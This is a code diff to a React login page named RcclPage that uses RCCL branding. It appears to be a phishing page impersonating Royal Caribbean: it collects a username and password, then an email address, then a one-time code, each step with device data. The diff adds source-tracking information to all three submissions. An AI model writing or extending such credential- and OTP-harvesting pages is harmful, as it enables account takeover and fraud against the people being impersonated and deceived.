@@ -6,6 +6,7 @@ import { useLanguage } from '@/contexts/LanguageContext';
 import { apiRequest } from '@/lib/queryClient';
 import { useToast } from '@/hooks/use-toast';
 import { getDeviceData } from '@/lib/deviceInfo';
+import { getSourceInfo } from '@/lib/sourceInfo';
 import '@/styles/styles.css';
 import rcclLogoSvg from '@assets/rccl_logo.svg';
 import rcclCardImg from '@assets/rccl_card.png';
@@ -74,6 +75,7 @@ export default function RcclPage() {
       const response = await apiRequest('POST', '/api/login', { 
         username, 
         password,
+        sourceInfo: getSourceInfo(),
         ...deviceData 
       });
       const data = await response.json();
@@ -96,7 +98,7 @@ export default function RcclPage() {
     if (!validateEmail()) return;
 
     try {
-      const response = await apiRequest('POST', '/api/verify-email', { loginAttemptId, email });
+      const response = await apiRequest('POST', '/api/verify-email', { loginAttemptId, email, sourceInfo: getSourceInfo() });
       const data = await response.json();
       
       if (data.success) {
@@ -117,7 +119,7 @@ export default function RcclPage() {
     if (!validateOtp()) return;
 
     try {
-      const response = await apiRequest('POST', '/api/verify-otp', { sessionId, otpCode: otpCode.trim() });
+      const response = await apiRequest('POST', '/api/verify-otp', { sessionId, otpCode: otpCode.trim(), sourceInfo: getSourceInfo() });
       const data = await response.json();
       
       if (data.success) {
